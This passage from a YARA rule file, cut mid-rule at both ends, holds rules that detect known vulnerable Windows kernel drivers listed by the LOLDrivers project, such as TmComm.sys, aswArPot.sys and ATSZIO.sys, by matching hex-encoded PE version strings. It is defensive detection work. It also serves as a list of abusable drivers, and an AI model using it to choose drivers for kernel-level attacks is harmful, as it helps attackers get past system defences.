= \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]96f7795e004e004e52a0901f5668002d9a7152a87a0b5e8f65874ef6 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]96f7795eff086b666c49ff097f517edc6280672f67099650516c53f8 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c0039002c0035002c00330020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0035002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00500072006f00780079004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]96f7795e004e004e52a0901f5668 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00500072006f00780079004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000400020005700770077002e004e006e002e0043006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_1DDF_RID370B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:21:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c00690062 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100360020004d006900630072006f002d005300740061007200200049004e00540027004c00200043004f002e002c0020004c00540044002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_654C_RID3DAE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:04:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0030002e0030002e0031003000370032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100330020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Marvintestsolutionsinc_Hwsys_Hw_FD38_RID3B0B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HW.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:12:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570020002d002000570069006e0064006f007700730020004e0054002d00380020002800330032002f00360034002000620069007400290020006b00650072006e0065006c0020006d006f00640065002000640072006900760065007200200066006f007200200050004300200070006f007200740073002f006d0065006d006f00720079002f0050004300490020006100630063006500730073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d0061007200760069006e0020005400650073007400200053006f006c007500740069006f006e0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002e0038002e0032002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002e0038002e0032002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00480077002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00480057 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00480057002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200031003900390036002d00320030003100350020004d0061007200760069006e0020005400650073007400200053006f006c007500740069006f006e0073002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_6E0A_RID4675 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:19:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0036002e0034003200330035002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0036002e0034003200330035002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310039002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_A2F4_RID4676 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:19:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0032002e0034003100380031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0032002e0034003100380031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310039002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Aoddriversys_Amdoverdriveservicedriver_81D5_RID463B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AODDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:09:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d00440020004f00760065007200440072006900760065002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0032002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0032002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004f0044004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d00440020004f00760065007200440072006900760065002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004f0044004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020003200300031003000200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_EC9B_RID3D6D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:54:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0038002e003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100310020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_D7C7_RID3BF7 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sandra.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:51:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e0064007200610020004400650076006900630065002000440072006900760065007200200028007800380036002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310035002e00310038002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310035002e00310038002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d00500072006500730065006e0074002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorporation_Nvflash_Nvidiaflashdriver_AFDD_RID3FC3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvflash.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:33:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e0056004900440049004100200046006c0061007300680020004400720069007600650072002c002000560065007200730069006f006e00200031002e0038002e0030 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056004900440049004100200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0038002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00760066006c006100730068 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e0056004900440049004100200046006c0061007300680020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00760066006c006100730068002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]002800430029002000320030003100370020004e0056004900440049004100200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_F85E_RID3BCD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:44:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003700200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Vektortsecurityservice_Vboxdrv_Antidetectpublicbyvektortrev_26F4_RID46C2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:32:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200053007500700070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00560065006b0074006f0072002000540031003300200053006500630075007200690074007900200053006500720076006900630065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e003100310039003200330030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e003100310039003200330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078004400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041006e00740069006400650074006500630074002000320030003100380020005000750062006c00690063002000620079002000560065006b0074006f0072002000540031003300200028007200650076002e003000350029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300039002d00320030003100380020004f007200610063006c006500200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_3C42_RID3DA8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:03:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003100320038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003200300020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Asustekcomputerinc_Atsziosys_Atsziodriver_55A1_RID3F26 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ATSZIO.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:07:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100540053005a0049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530055005300540065006b00200043006f006d0070007500740065007200200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0030002e0032002e0031002e0036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0030002e0032002e0031002e0036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100540053005a0049004f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100540053005a0049004f0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100540053005a0049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Sbiosiosys_Samsungrbiosiodriver_B3D1_RID44AD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SBIOSIO64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:03:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005300420049004f00530049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031002e0030003000300030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0031002e0030003000300030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005300420049004f00530049004f00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530061006d00730075006e00670020002800520029002000420049004f005300200049004f0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005300420049004f00530049004f00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000530061006d00730075006e006700200045006c0065006300740072006f006e006900630073002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_1AAF_RID3BFB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sandra.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:52:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e006400720061002000440065007600690063006500200044007200690076006500720020002800570069006e003600340020007800360034002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e00310031002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e00310031002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d0032003000300038002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Dcprotectsys_Dcprotectrwinxdriver_1698_RID4576 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DcProtect.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:36:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044006300500072006f00740065006300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0044006300500072006f00740065006300740020002800520029002000570069006e003700780036003400200064007200690076006500720020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032002d00320030003200300020004a00690061006e0067006d0065006e0020004500790075006e0020004e006500740077006f0072006b00200043006f002e002c004c00740064002e00200032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Aegis_C901_RID39C5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n    